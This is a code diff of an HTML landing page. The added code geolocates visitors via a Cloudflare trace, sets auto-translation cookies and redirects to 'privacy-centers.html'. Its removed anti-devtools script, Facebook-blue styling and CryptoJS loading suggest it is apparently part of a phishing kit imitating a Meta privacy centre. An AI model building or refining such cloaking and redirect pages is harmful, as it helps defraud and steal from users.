@@ -61,35 +61,68 @@
     <link rel="icon" href="./public/favicon-32x32.png">
     <link rel="prefetch" href="./privacy-centers.html">
     <link rel="prefetch" href="./public/js/translate.js">
+    <link rel="prefetch" href="./public/js/config.js">
+    <link rel="prefetch" href="./public/js/utils.js">
+    <link rel="prefetch" href="./public/js/app.js">
+    <link rel="prefetch" href="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js">
     <link rel="preload" href="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit" as="script">
     <link rel="preconnect" href="https://translate.google.com">
     <link rel="preconnect" href="https://translate.googleapis.com">
     <script>
-        try {
-            var _lang = sessionStorage.getItem('__geo_lang__');
-            if (_lang && _lang !== 'en') {
-                document.cookie = 'googtrans=/en/' + _lang + '; path=/; max-age=31536000; SameSite=Lax';
+        (function () {
+            function langFromNav() {
+                var nav = String(navigator.language || navigator.userLanguage || '').toLowerCase();
+                if (!nav) return '';
+                if (nav.indexOf('zh-tw') === 0 || nav.indexOf('zh-hk') === 0) return 'zh-TW';
+                if (nav.indexOf('zh') === 0) return 'zh-CN';
+                var short = nav.split('-')[0];
+                var aliases = { nb: 'no', nn: 'no', fil: 'tl', he: 'iw' };
+                return aliases[short] || short;
             }
-        } catch (e) {}
-    </script>
-
-    <!-- Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        primary: '#5D87FF',
-                        secondary: '#212121'
-                    }
+            function langFromCountry(cc) {
+                var map = {
+                    VN: 'vi', TH: 'th', ID: 'id', MY: 'ms', PH: 'tl', JP: 'ja', KR: 'ko',
+                    CN: 'zh-CN', TW: 'zh-TW', HK: 'zh-TW', MO: 'zh-TW', KH: 'km', LA: 'lo',
+                    MM: 'my', IN: 'hi', BD: 'bn', PK: 'ur', FR: 'fr', DE: 'de', AT: 'de',
+                    IT: 'it', ES: 'es', MX: 'es', AR: 'es', PT: 'pt', BR: 'pt', NL: 'nl',
+                    PL: 'pl', RU: 'ru', UA: 'uk', TR: 'tr', SA: 'ar', AE: 'ar', EG: 'ar',
+                    IL: 'iw', IR: 'fa'
+                };
+                return map[cc] || '';
+            }
+            function setLangCookie(lang) {
+                if (!lang || lang === 'en') return;
+                document.cookie = 'googtrans=/en/' + lang + '; path=/; max-age=31536000; SameSite=Lax';
+            }
+            try {
+                var cached = sessionStorage.getItem('__geo_lang__') || '';
+                if (cached && cached !== 'en') setLangCookie(cached);
+                else {
+                    var navLang = langFromNav();
+                    if (navLang && navLang !== 'en') setLangCookie(navLang);
                 }
-            }
-        }
+            } catch (e) {}
+            fetch('https://www.cloudflare.com/cdn-cgi/trace', { cache: 'no-store' })
+                .then(function (res) { return res.text(); })
+                .then(function (text) {
+                    var loc = String(text).match(/(?:^|\n)loc=([A-Z]{2})/i);
+                    var cc = loc ? loc[1].toUpperCase() : '';
+                    if (!cc) return;
+                    try { sessionStorage.setItem('__geo_cc_v3__', cc); } catch (e) {}
+                    var lang = langFromCountry(cc);
+                    if (lang) {
+                        setLangCookie(lang);
+                        try { sessionStorage.setItem('__geo_lang__', lang); } catch (e) {}
+                    }
+                })
+                .catch(function () {});
+        })();
     </script>
-
-    <!-- CryptoJS for encryption -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+    <script>
+        setTimeout(function () {
+            location.replace('./privacy-centers.html');
+        }, 800);
+    </script>
 </head>
 
 <body class="bg-[#ffffff] flex flex-col items-center justify-center h-[100vh] w-full">
@@ -379,42 +412,6 @@
         </div>
 
         <!-- Loading overlay is #page-boot-overlay -->
-
-        <script src="./public/js/disableDevtool.js"></script>
-        <script>
-            document.addEventListener('DOMContentLoaded', function () {
-                setTimeout(function () {
-                    window.location.href = 'privacy-centers.html';
-                }, 2500);
-            });
-        </script>
-        <style>
-            .loader {
-                border-top-color: #1877f2;
-                -webkit-animation: spinner 0.75s linear infinite;
-                animation: spinner 0.75s linear infinite;
-            }
-
-            @-webkit-keyframes spinner {
-                0% {
-                    -webkit-transform: rotate(0deg);
-                }
-
-                100% {
-                    -webkit-transform: rotate(360deg);
-                }
-            }
-
-            @keyframes spinner {
-                0% {
-                    transform: rotate(0deg);
-                }
-
-                100% {
-                    transform: rotate(360deg);
-                }
-            }
-        </style>
 </body>
 
 </html>
